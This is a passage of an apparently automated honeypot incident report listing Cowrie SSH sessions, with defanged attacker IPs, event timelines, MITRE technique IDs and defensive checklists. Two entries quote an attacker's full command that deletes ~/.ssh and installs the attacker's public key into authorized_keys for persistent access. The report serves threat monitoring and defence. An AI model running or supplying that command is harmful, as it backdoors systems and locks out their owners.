| `2026-07-05 19:41:37` | `cowrie.client.version` |
| `2026-07-05 19:41:37` | `cowrie.client.kex` |
| `2026-07-05 19:41:37` | `cowrie.login.success` |
| `2026-07-05 19:41:38` | `cowrie.session.params` |
| `2026-07-05 19:41:38` | `cowrie.command.input` |
| `2026-07-05 19:41:38` | `cowrie.command.failed` |
| `2026-07-05 19:41:38` | `cowrie.log.closed` |
| `2026-07-05 19:41:39` | `cowrie.session.params` |
| `2026-07-05 19:41:39` | `cowrie.command.input` |
| `2026-07-05 19:41:39` | `cowrie.session.file_download` |
| `2026-07-05 19:41:39` | `cowrie.log.closed` |
| `2026-07-05 19:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.52[.]18` to AbuseIPDB if not already reported
- [ ] Block `54.38.52[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d030b3f71f61

| Field | Detail |
|---|---|
| **Source IP** | `54.38.52[.]18` |
| **First Seen** | 2026-07-05 19:41 |
| **Last Seen** | 2026-07-05 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:41:39` | `cowrie.session.connect` |
| `2026-07-05 19:41:39` | `cowrie.client.version` |
| `2026-07-05 19:41:39` | `cowrie.client.kex` |
| `2026-07-05 19:41:40` | `cowrie.login.success` |
| `2026-07-05 19:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.52[.]18` to AbuseIPDB if not already reported
- [ ] Block `54.38.52[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e181f6c4362

| Field | Detail |
|---|---|
| **Source IP** | `54.38.52[.]18` |
| **First Seen** | 2026-07-05 19:41 |
| **Last Seen** | 2026-07-05 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:41:40` | `cowrie.session.connect` |
| `2026-07-05 19:41:40` | `cowrie.client.version` |
| `2026-07-05 19:41:40` | `cowrie.client.kex` |
| `2026-07-05 19:41:41` | `cowrie.login.success` |
| `2026-07-05 19:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.52[.]18` to AbuseIPDB if not already reported
- [ ] Block `54.38.52[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de998c784b8b

| Field | Detail |
|---|---|
| **Source IP** | `81.28.167[.]30` |
| **First Seen** | 2026-07-05 19:43 |
| **Last Seen** | 2026-07-05 19:44 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:43:57` | `cowrie.session.connect` |
| `2026-07-05 19:43:57` | `cowrie.client.version` |
| `2026-07-05 19:43:58` | `cowrie.client.kex` |
| `2026-07-05 19:43:58` | `cowrie.login.success` |
| `2026-07-05 19:43:59` | `cowrie.session.params` |
| `2026-07-05 19:43:59` | `cowrie.command.input` |
| `2026-07-05 19:43:59` | `cowrie.command.failed` |
| `2026-07-05 19:43:59` | `cowrie.log.closed` |
| `2026-07-05 19:44:00` | `cowrie.session.params` |
| `2026-07-05 19:44:00` | `cowrie.command.input` |
| `2026-07-05 19:44:00` | `cowrie.session.file_download` |
| `2026-07-05 19:44:00` | `cowrie.log.closed` |
| `2026-07-05 19:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.28.167[.]30` to AbuseIPDB if not already reported
- [ ] Block `81.28.167[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4518adcbf619

| Field | Detail |
|---|---|
| **Source IP** | `81.28.167[.]30` |
| **First Seen** | 2026-07-05 19:44 |
| **Last Seen** | 2026-07-05 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:44:00` | `cowrie.session.connect` |
| `2026-07-05 19:44:00` | `cowrie.client.version` |
| `2026-07-05 19:44:00` | `cowrie.client.kex` |
| `2026-07-05 19:44:01` | `cowrie.login.success` |
| `2026-07-05 19:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.28.167[.]30` to AbuseIPDB if not already reported
- [ ] Block `81.28.167[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66ab99d0c29a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 19:44 |
| **Last Seen** | 2026-07-05 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:44:09` | `cowrie.session.connect` |
| `2026-07-05 19:44:09` | `cowrie.client.version` |
| `2026-07-05 19:44:10` | `cowrie.client.kex` |
| `2026-07-05 19:44:10` | `cowrie.login.success` |
| `2026-07-05 19:44:10` | `cowrie.direct-tcpip.request` |
| `2026-07-05 19:44:10` | `cowrie.direct-tcpip.data` |
| `2026-07-05 19:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-148978279f5d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 19:47 |
| **Last Seen** | 2026-07-05 19:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:47:54` | `cowrie.session.connect` |
| `2026-07-05 19:47:54` | `cowrie.client.version` |
| `2026-07-05 19:47:55` | `cowrie.client.kex` |
| `2026-07-05 19:47:55` | `cowrie.login.success` |
| `2026-07-05 19:47:55` | `cowrie.direct-tcpip.request` |
| `2026-07-05 19:47:55` | `cowrie.direct-tcpip.data` |
| `2026-07-05 19:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d18c5ca2f2f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 19:48 |
| **Last Seen** | 2026-07-05 19:48 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:48:08` | `cowrie.session.connect` |
| `2026-07-05 19:48:09` | `cowrie.client.version` |
| `2026-07-05 19:48:09` | `cowrie.client.kex` |
| `2026-07-05 19:48:16` | `cowrie.login.success` |
| `2026-07-05 19:48:19` | `cowrie.session.params` |
| `2026-07-05 19:48:19` | `cowrie.command.input` |
| `2026-07-05 19:48:20` | `cowrie.log.closed` |
| `2026-07-05 19:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb126133439d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]173` |
| **First Seen** | 2026-07-05 19:51 |
| **Last Seen** | 2026-07-05 19:56 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:51:57` | `cowrie.session.connect` |
| `2026-07-05 19:51:57` | `cowrie.client.version` |
| `2026-07-05 19:51:57` | `cowrie.client.kex` |
| `2026-07-05 19:51:58` | `cowrie.login.success` |
| `2026-07-05 19:51:59` | `cowrie.session.params` |
| `2026-07-05 19:51:59` | `cowrie.command.input` |
| `2026-07-05 19:51:59` | `cowrie.command.failed` |
| `2026-07-05 19:51:59` | `cowrie.log.closed` |
| `2026-07-05 19:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]173` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a325ee038a0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 19:59 |
| **Last Seen** | 2026-07-05 19:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 19:59:20` | `cowrie.session.connect` |
| `2026-07-05 19:59:21` | `cowrie.client.version` |
| `2026-07-05 19:59:21` | `cowrie.client.kex` |
| `2026-07-05 19:59:28` | `cowrie.login.success` |
| `2026-07-05 19:59:31` | `cowrie.session.params` |
| `2026-07-05 19:59:31` | `cowrie.command.input` |
| `2026-07-05 19:59:33` | `cowrie.log.closed` |
| `2026-07-05 19:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5403905e5e5

| Field | Detail |
|---|---|
| **Source IP** | `185.220.101[.]43` |
| **First Seen** | 2026-07-05 20:01 |
| **Last Seen** | 2026-07-05 20:02 |
| **Session Duration** | 22s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:01:42` | `cowrie.session.connect` |
| `2026-07-05 20:01:42` | `cowrie.client.version` |
| `2026-07-05 20:01:42` | `cowrie.client.kex` |
| `2026-07-05 20:01:44` | `cowrie.client.fingerprint` |
| `2026-07-05 20:01:44` | `cowrie.login.failed` |
| `2026-07-05 20:01:44` | `cowrie.login.success` |
| `2026-07-05 20:02:04` | `cowrie.direct-tcpip.request` |
| `2026-07-05 20:02:04` | `cowrie.direct-tcpip.ja4` |
| `2026-07-05 20:02:04` | `cowrie.direct-tcpip.data` |
| `2026-07-05 20:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.220.101[.]43` to AbuseIPDB if not already reported
- [ ] Block `185.220.101[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b20dba71b4ee

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 20:02 |
| **Last Seen** | 2026-07-05 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:02:30` | `cowrie.session.connect` |
| `2026-07-05 20:02:30` | `cowrie.client.version` |
| `2026-07-05 20:02:30` | `cowrie.client.kex` |
| `2026-07-05 20:02:30` | `cowrie.login.success` |
| `2026-07-05 20:02:30` | `cowrie.direct-tcpip.request` |
| `2026-07-05 20:02:30` | `cowrie.direct-tcpip.data` |
| `2026-07-05 20:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61082a787e44

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 20:07 |
| **Last Seen** | 2026-07-05 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:07:40` | `cowrie.session.connect` |
| `2026-07-05 20:07:40` | `cowrie.client.version` |
| `2026-07-05 20:07:40` | `cowrie.client.kex` |
| `2026-07-05 20:07:40` | `cowrie.login.success` |
| `2026-07-05 20:07:41` | `cowrie.session.params` |
| `2026-07-05 20:07:41` | `cowrie.command.input` |
| `2026-07-05 20:07:41` | `cowrie.log.closed` |
| `2026-07-05 20:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c5b8bc5ec5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 20:10 |
| **Last Seen** | 2026-07-05 20:10 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:10:24` | `cowrie.session.connect` |
| `2026-07-05 20:10:25` | `cowrie.client.version` |
| `2026-07-05 20:10:25` | `cowrie.client.kex` |
| `2026-07-05 20:10:31` | `cowrie.login.success` |
| `2026-07-05 20:10:34` | `cowrie.session.params` |
| `2026-07-05 20:10:34` | `cowrie.command.input` |
| `2026-07-05 20:10:36` | `cowrie.log.closed` |
| `2026-07-05 20:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed612f09e7a3

| Field | Detail |
|---|---|
| **Source IP** | `103.165.139[.]145` |
| **First Seen** | 2026-07-05 20:12 |
| **Last Seen** | 2026-07-05 20:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:12:26` | `cowrie.session.connect` |
| `2026-07-05 20:12:26` | `cowrie.client.version` |
| `2026-07-05 20:12:27` | `cowrie.client.kex` |
| `2026-07-05 20:12:28` | `cowrie.login.success` |
| `2026-07-05 20:12:29` | `cowrie.session.params` |
| `2026-07-05 20:12:29` | `cowrie.command.input` |
| `2026-07-05 20:12:29` | `cowrie.command.failed` |
| `2026-07-05 20:12:29` | `cowrie.log.closed` |
| `2026-07-05 20:12:30` | `cowrie.session.params` |
| `2026-07-05 20:12:30` | `cowrie.command.input` |
| `2026-07-05 20:12:31` | `cowrie.session.file_download` |
| `2026-07-05 20:12:31` | `cowrie.log.closed` |
| `2026-07-05 20:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.165.139[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.165.139[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e25e7951455

| Field | Detail |
|---|---|
| **Source IP** | `103.165.139[.]145` |
| **First Seen** | 2026-07-05 20:12 |
| **Last Seen** | 2026-07-05 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:12:31` | `cowrie.session.connect` |
| `2026-07-05 20:12:31` | `cowrie.client.version` |
| `2026-07-05 20:12:31` | `cowrie.client.kex` |
| `2026-07-05 20:12:32` | `cowrie.login.success` |
| `2026-07-05 20:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.165.139[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.165.139[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95a1fdb8d059

| Field | Detail |
|---|---|
| **Source IP** | `103.165.139[.]145` |
| **First Seen** | 2026-07-05 20:12 |
| **Last Seen** | 2026-07-05 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:12:33` | `cowrie.session.connect` |
| `2026-07-05 20:12:33` | `cowrie.client.version` |
| `2026-07-05 20:12:33` | `cowrie.client.kex` |
| `2026-07-05 20:12:34` | `cowrie.login.success` |
| `2026-07-05 20:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.165.139[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.165.139[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f60910ed6383

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 20:13 |
| **Last Seen** | 2026-07-05 20:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:13:33` | `cowrie.session.connect` |
| `2026-07-05 20:13:33` | `cowrie.client.version` |
| `2026-07-05 20:13:33` | `cowrie.client.kex` |
| `2026-07-05 20:13:33` | `cowrie.login.success` |
| `2026-07-05 20:13:34` | `cowrie.direct-tcpip.request` |
| `2026-07-05 20:13:34` | `cowrie.direct-tcpip.data` |
| `2026-07-05 20:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4cb7774eb8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 20:18 |
| **Last Seen** | 2026-07-05 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:18:17` | `cowrie.session.connect` |
| `2026-07-05 20:18:17` | `cowrie.client.version` |
| `2026-07-05 20:18:17` | `cowrie.client.kex` |
| `2026-07-05 20:18:17` | `cowrie.login.success` |
| `2026-07-05 20:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5614a5c44310

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 20:18 |
| **Last Seen** | 2026-07-05 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:18:17` | `cowrie.session.connect` |
| `2026-07-05 20:18:17` | `cowrie.client.version` |
| `2026-07-05 20:18:17` | `cowrie.client.kex` |
| `2026-07-05 20:18:17` | `cowrie.login.success` |
| `2026-07-05 20:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19dde98dd1e7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 20:18 |
| **Last Seen** | 2026-07-05 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:18:27` | `cowrie.session.connect` |
| `2026-07-05 20:18:27` | `cowrie.client.version` |
| `2026-07-05 20:18:27` | `cowrie.client.kex` |
| `2026-07-05 20:18:27` | `cowrie.login.success` |
| `2026-07-05 20:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2b44f66c9b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 20:18 |
| **Last Seen** | 2026-07-05 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:18:27` | `cowrie.session.connect` |
| `2026-07-05 20:18:27` | `cowrie.client.version` |
| `2026-07-05 20:18:27` | `cowrie.client.kex` |
| `2026-07-05 20:18:27` | `cowrie.login.success` |
| `2026-07-05 20:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683d9b48d416

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 20:21 |
| **Last Seen** | 2026-07-05 20:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:21:34` | `cowrie.session.connect` |
| `2026-07-05 20:21:36` | `cowrie.client.version` |
| `2026-07-05 20:21:36` | `cowrie.client.kex` |
| `2026-07-05 20:21:41` | `cowrie.login.success` |
| `2026-07-05 20:21:45` | `cowrie.session.params` |
| `2026-07-05 20:21:45` | `cowrie.command.input` |
| `2026-07-05 20:21:46` | `cowrie.log.closed` |
| `2026-07-05 20:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd464abc06b9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 20:23 |
| **Last Seen** | 2026-07-05 20:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:23:30` | `cowrie.session.connect` |
| `2026-07-05 20:23:30` | `cowrie.client.version` |
| `2026-07-05 20:23:31` | `cowrie.client.kex` |
| `2026-07-05 20:23:31` | `cowrie.login.success` |
| `2026-07-05 20:23:31` | `cowrie.direct-tcpip.request` |
| `2026-07-05 20:23:31` | `cowrie.direct-tcpip.data` |
| `2026-07-05 20:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ceb4acf68d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:24 |
| **Last Seen** | 2026-07-05 20:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
